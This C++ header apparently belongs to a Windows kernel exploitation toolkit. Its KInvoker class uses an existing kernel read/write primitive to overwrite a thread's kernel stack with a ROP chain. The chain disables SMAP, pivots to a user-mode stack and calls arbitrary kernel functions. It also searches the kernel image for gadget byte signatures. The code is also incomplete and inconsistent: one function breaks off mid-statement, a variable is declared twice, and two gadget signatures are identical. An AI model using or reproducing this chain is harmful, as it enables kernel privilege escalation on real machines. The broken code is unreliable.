#pragma once

#include "Resolves.h"
#include "Offsets.h"

#include <queue>
#include <functional>
#include <condition_variable>
#include <atomic>


extern "C"
NTSTATUS NtWaitForSingleObject(
	HANDLE Object,
	bool Aleratable,
	DWORD Timeout
);

constexpr ULONG c_TrapFrameSize = 0x190;

class KInvoker 
{
public:
	KInvoker() : m_TerminateWorker(false) {
		m_WorkerThread = std::thread(&KInvoker::WorkerThread, this);
	}

	~KInvoker() {
		{
			std::lock_guard<std::mutex> lock(m_TaskQueueMutex);
			m_TerminateWorker = true;
		}
		m_QueueUpdateVariable.notify_all();
		if (m_WorkerThread.joinable()) {
			m_WorkerThread.join();
		}
	}

	template <typename... Args>
	Qword CallKernelFunction(
		kAddress Function,
		Args... Arguments)
	{
		auto args = std::make_tuple(std::forward<Args>(Arguments)...);
		HANDLE event = CreateEventA(nullptr, true, false, nullptr);
		DWORD currentTid = GetCurrentThreadId();
		Qword returnValue = 0;

		m_TaskQueue.push([args, event, Function, currentTid, &returnValue]
			{
				kAddress thread = Resolves::GetThreadAddress(currentTid);
				OverrideThreadStackWithFunctionCall(Function, thread, &returnValue, args);
				SetEvent(event);
			});

		auto returnValue = Qword(NtWaitForSingleObject(event, false, INFINITE));
		return returnValue;
	}

private:

	static kAddress GetNtWaitForSingleObjectReturnAddress(kAddress CallingThread)
	{
		//
		// We target the last return address before returning to UserMode. The call stack after
		// calling NtWaitForSingleObject is something like the following:
		// - nt!NtWaitForSingleObject
		// - nt!KiSystemServiceCopyEnd+0x25
		// - ntdll!NtWaitForSingleObject
		//
		// Note that we're switching to UM stack after KiSystemServiceCopyEnd, hence it makes sense to target it.
		// We'll start scanning from the initial stack 
		//

		kAddress initialStack = g_Rw->ReadQword(CallingThread + Offsets::EThread::InitialStack);

		kAddress returnAddress = g_Rw->ReadQword(initialStack - c_TrapFrameSize - sizeof(kAddress));
		return returnAddress;
	}

	template <typename... Args>
	static void OverrideThreadStackWithFunctionCall(
		_In_ kAddress Function,
		_In_ kAddress CallingThread,
		_Inout_ Qword* ReturnValue,
		_In_ std::tuple<Args...>&& Arguments
	) {

		kAddress rsp = GetNtWaitForSingleObjectReturnAddress(CallingThread);

		//
		// Read previous trap frame & for later restoration
		//
		std::vector<Byte> previousStackData = g_Rw->ReadBuffer(rsp + 8, c_TrapFrameSize + 8);

		
		constexpr DWORD c_KernelStackSize = 12 * 0x1000;

		// we add another page for our gadgets' shenanigens
		constexpr DWORD c_PivotedStackSize = c_KernelStackSize + 0x1000;
		thread_local Byte* newStack = VirtualAlloc(nullptr, c_KernelStackSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		auto* stackTop = newStack + c_KernelStackSize;
		
#define PUT_STACK(val) g_Rw->WriteQword(rsp, val); rsp += 8;

		//
		// Disable SMAP so we could pivot into user stack. Recall the gadget is
		// 
		// KiQuantumEnd:
		// ...
		// clac
		// jmp     loc_14021B880
		// 
		// loc_14021B880:
		// add     rsp, 0B8h
		// pop     r15
		// pop     r14
		// pop     r13
		// pop     r12
		// pop     rdi
		// pop     rsi
		// pop     rbx
		// pop     rbp
		// retn
		// 
		// Note: might come later to fuck us :(
		//

		PUT_STACK(s_Gadgets.DisableSmap);
		
		rsp += 0xb8;
		PUT_STACK(0x41); // pop r15
		PUT_STACK(0x41); // pop r14
		PUT_STACK(0x41); // pop r13
		PUT_STACK(0x41); // pop r12
		PUT_STACK(0x41); // pop rdi
		PUT_STACK(0x41); // pop rsi
		PUT_STACK(0x41); // pop rbx
		// Our pivot gadget uses rbp as the new stack pointer
		PUT_STACK(newStack + c_KernelStackSize); // pop rbp

		//
		// Stack pivot gadget. Looks as follows:
		// 
		// RtlRestoreContext:
		// ...
		// .text:00000001404081F6                  mov     rsp, rbp
		// .text:00000001404081F9                  add     rsp, 30h
		// .text:00000001404081FD                  pop     rdi
		// .text:00000001404081FE                  pop     rsi
		// .text:00000001404081FF                  pop     rbp
		// .text:0000000140408200                  retn
		//

		PUT_STACK(s_Gadgets.StackPivot);
		
		//
		// Note: We've now switched to usermode stack.
		//

		rsp = stackTop;

#undef PUT_STACK
#define PUT_STACK(val) *(Qword*)(rsp)++ = Qword(val);

		rsp += 0x30;		// add rsp, 0x30
		PUT_STACK(0x1337);	// pop rdi
		PUT_STACK(0x1337);	// pop rsp
		PUT_STACK(0x1337);	// pop rbp

		//
		// We'll use the retpoline gadget. Recall it looks as follows:
		//
		// __guard_retpoline_exit_indirect_rax:
		//  ...
		//	mov rax, [rsp+0x20]
		//	mov rcx, [rsp+0x28]
		//	mov rdx, [rsp+0x30]
		//	mov r8,  [rsp+0x38]
		//	mov r9,  [rsp+0x40]
		//	add rsp, 0x48
		//  jmp rax
		//

		PUT_STACK(s_RetpolineGadget);

		rsp += 0x20;

		// add jump target: Function
		PUT_STACK(Function);
		auto* beforeArgsRsp = rsp;
		
		// add register arguments
		constexpr auto NumberOfArguments = std::size(Arguments);

		if constexpr (NumberOfArguments >= 1) PUT_STACK(std::get<0>(Arguments));
		if constexpr (NumberOfArguments >= 2) PUT_STACK(std::get<1>(Arguments));
		if constexpr (NumberOfArguments >= 3) PUT_STACK(std::get<2>(Arguments));
		if constexpr (NumberOfArguments >= 4) PUT_STACK(std::get<3>(Arguments));

		// update rsp to after add rsp, 0x48
		rsp = beforeArgsRsp + 0x28;

		// add remaining stack arguments
		
		rsp += 0x20; // save shadow space

		if constexpr (NumberOfArguments >= 5) {
			auto indiciesOfRemainingArgs = std::make_index_sequence<NumberOfArguments - 4>{};
			Qword remaining[] = { Qword(std::get<indiciesOfRemainingArgs>(Arguments))... };
			std::memcpy(rsp, remaining, sizeof(remaining));

			rsp += sizeof(remaining);
		}

		// go back to where we've been - and return to user mode lol
		
		std::memcpy(rsp, previousStackData.data(), previousStackData.size());
	}

	void WorkerThread()
	{
		while (true)
		{
			std::function<void()> workItem;
			{
				std::unique_lock<std::mutex> lock(m_TaskQueueMutex);
				m_QueueUpdateVariable.wait(lock, [this] { return !m_TaskQueue.empty() || terminate; });

				if (m_TerminateWorker && m_TaskQueue.empty()) {
					return;
				}

				workItem = std::move(m_TaskQueue.front());
				m_TaskQueue.pop();
			}
			workItem();
		}
	}

	static std::optional<kAddress> TryFindSmapGadget()
	{
		//
		// We'll try finding every clac; jmp instruction there is, 
		// and use match the resulting gadget with our gadget.
		//

		constexpr Byte ClacJmpRel32[] = { 0x0F, 0x01, 0xCA, 0xE9 };
		auto signature = Sig::FromBytes(std::span<const Byte>(ClacJmpRel32));
		
		const Byte* smapGadget = nullptr;
		g_KernelBinary->ForEveryCodeSignatureOccurrence(signature,
			[&](const Byte* occurrence) -> bool {
				auto* rel32 = occurrence + sizeof(ClacJmpRel32);
				auto* jmpTarget = occurrence + *(int*)rel32 + 5;

				// simple bounds check
				//if (jmpTarget > g_KernelBinary->)

				auto found = Sig::FindSignatureInBuffer(
					std::span<
				)
			});
	}

	static bool InitializeGadgets()
	{
		const std::string RetpolineCode = "488b442420488b4c2428488b5424304c8b4424384c8b4c24404883c44848ffe0";
		auto retpolineSignature = Sig::FromHex(RetpolineCode);
		auto retpolineAddress =  g_KernelBinary->FindSignature(retpolineSignature, KernelBinary::LocationFlags::InCode);
		if (!retpolineAddress) return false;
		s_Gadgets.Retpoline = retpolineAddress.value();

		auto disableSmapSignature = Sig::FromHex(
			"488b442420488b4c2428488b5424304c8b4424384c8b4c24404883c44848ffe0"
		);
		auto disableSmapAddress = g_KernelBinary->FindSignature(disableSmapSignature, KernelBinary::LocationFlags::InCode);
		if (!disableSmapAddress) return false;
		s_Gadgets.DisableSmap = disableSmapAddress.value();

		const std::string StackPivotCode = "488be54883c4305f5e5dc3";
		auto stackPivotSignature = Sig::FromHex(StackPivotCode);
		auto stackPivotAddress = g_KernelBinary->FindSignature(stackPivotSignature, KernelBinary::LocationFlags::InCode);
		if (!stackPivotAddress) return false;
		s_Gadgets.StackPivot = stackPivotAddress.value();
	}


private:
	std::queue<std::function<void()>> m_TaskQueue;
	std::thread m_WorkerThread;
	std::mutex m_TaskQueueMutex;
	std::condition_variable m_QueueUpdateVariable;
	std::atomic<bool> m_TerminateWorker;

	static struct {
		kAddress Retpoline;
		kAddress StackPivot;
		kAddress DisableSmap;
	} s_Gadgets;
};
